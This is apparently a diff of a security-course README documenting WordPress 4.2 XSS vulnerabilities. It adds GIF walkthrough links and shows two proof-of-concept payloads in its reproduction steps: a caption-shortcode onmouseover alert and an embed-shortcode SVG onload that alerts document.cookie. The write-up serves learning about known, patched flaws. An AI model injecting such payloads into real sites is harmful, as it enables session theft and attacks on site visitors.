@@ -20,7 +20,7 @@ Time spent: **8** hours spent in total
     - Vulnerability types: XSS
     - Tested in version: 4.2
     - Fixed in version: 4.2.3
-  - [ ] GIF Walkthrough: 
+  - [ ] GIF Walkthrough: <img src="2.gif" alt="2">
   - [ ] Steps to recreate: Running the XSS code in a posting <a href="[caption code=">]</a><a title=" onmouseover=alert('hacked')  ">link</a> to <a href="</a><a title=" onmouseover=alert('hacked')  ">link</a>
   - [ ] Affected source code:
     - [Code Link](https://klikki.fi/adv/wordpress3.html)
@@ -29,7 +29,7 @@ Time spent: **8** hours spent in total
     - Vulnerability types: XSS
     - Tested in version: 4.2
     - Fixed in version: 4.2.13
-  - [ ] GIF Walkthrough: 
+  - [ ] GIF Walkthrough: <img src="3.gif" alt="3">
   - [ ] Steps to recreate: Run a XSS code to bypass the regular expressions and embed shortcode function URL. Users who view the post will execute the code [embed src='https://youtube.com/embed/12345\x3csvg onload=alert(document.cookie)\x3e'][/embed]
   - [ ] Affected source code:
     - [Code Link](https://core.trac.wordpress.org/browser/trunk/src/wp-includes/class-wp-embed.php)
